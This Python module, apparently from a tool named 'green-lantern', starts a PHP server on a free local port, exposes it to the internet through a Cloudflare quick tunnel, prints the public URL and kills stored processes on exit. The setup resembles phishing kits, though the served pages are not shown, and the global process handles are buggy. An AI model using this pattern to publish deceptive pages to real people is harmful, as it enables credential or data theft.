from colorama import Fore,Back,Style
import subprocess,json,time,hashlib

import subprocess
import socket
import time
import random
import re
import requests
import signal
import os
import platform

# Store process references globally
php_process = None
tunnel_process = None

def kill_php_proc():
    with open("green-lantern/Settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
        pid = data["pid"]

    try:
        for i in pid:
            subprocess.getoutput(f"kill -9 {i}")
        
        else:
            pid.clear()
            data["pid"] = []
            with open("green-lantern/Settings.json", "w") as jsonFile:
                json.dump(data, jsonFile)

    except:
        pass



def md5_hash():
    str2hash = time.strftime("%Y-%m-%d-%H:%M", time.gmtime())
    result = hashlib.md5(str2hash.encode())
    return result

def get_project_root():
    """Automatically detect the project root directory where index.php is located."""
    script_directory = os.path.dirname(os.path.abspath(__file__))  # This is inside `modules/`
    project_root = os.path.abspath(os.path.join(script_directory, "..", "green-lantern"))  # Move up one level

    # Ensure the directory exists and contains an index.php file
    if not os.path.exists(os.path.join(project_root, "index.php")):
        print(f"❌ Error: index.php not found in '{project_root}'")
        return None

    return project_root

def find_free_port():
    """Find an available port dynamically."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("", 0))  # Bind to any free port
        return s.getsockname()[1]  # Return assigned port number

def run_php_server(port=2525):
    """Start PHP server on a free port and launch Cloudflare Tunnel."""
    document_root = get_project_root()
    if not document_root:
        print("❌ Cannot start PHP server: No valid document root found.")
        return  # Exit if no valid document root

    while True:
        try:
            # Check if the port is in use
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                if s.connect_ex(("localhost", port)) == 0:
                    print(f"⚠️ Port {port} is busy, trying another...")
                    port = random.randint(2000, 9999)  # Pick a random port
                else:
                    break  # Port is free
        except Exception:
            break  # Assume the port is free

    print(f"🚀 Starting PHP server on port {port} with root: {document_root}...")
    php_process = subprocess.Popen(
        ["php", "-S", f"0.0.0.0:{port}", "-t", document_root],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    # Wait a few seconds to ensure PHP server starts
    time.sleep(2)

    # Start Cloudflare Tunnel
    print("🌍 Starting Cloudflare Tunnel...")
    tunnel_process = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )

    cloudflare_url = None

    # Read Cloudflare output line by line and extract URL
    while True:
        line = tunnel_process.stdout.readline()
        if not line:
            break
        print(line.strip())  # Print output for debugging

        # Extract the Cloudflare Tunnel URL
        match = re.search(r"https:\/\/[a-zA-Z0-9-]+\.trycloudflare\.com", line)
        if match:
            cloudflare_url = match.group(0)
            print(f"✅ Your public URL: {cloudflare_url}")
            break

    if not cloudflare_url:
        print("❌ Cloudflare Tunnel failed to start or URL was not found.")

    return port  # Return the running port

def stop_services():
    """Stop PHP server and Cloudflare Tunnel when exiting."""
    global php_process, tunnel_process

    if php_process:
        print("🛑 Stopping PHP server...")
        php_process.terminate()
        php_process.wait()

    if tunnel_process:
        print("🛑 Stopping Cloudflare Tunnel...")
        tunnel_process.terminate()
        tunnel_process.wait()

    print("✅ Services stopped successfully.")

# Handle termination signals (CTRL+C, system exit)
def signal_handler(sig, frame):
    print("\n🛑 Exiting... Cleaning up processes.")
    stop_services()
    exit(0)

signal.signal(signal.SIGINT, signal_handler)  # Handle CTRL+C
signal.signal(signal.SIGTERM, signal_handler)  # Handle system termination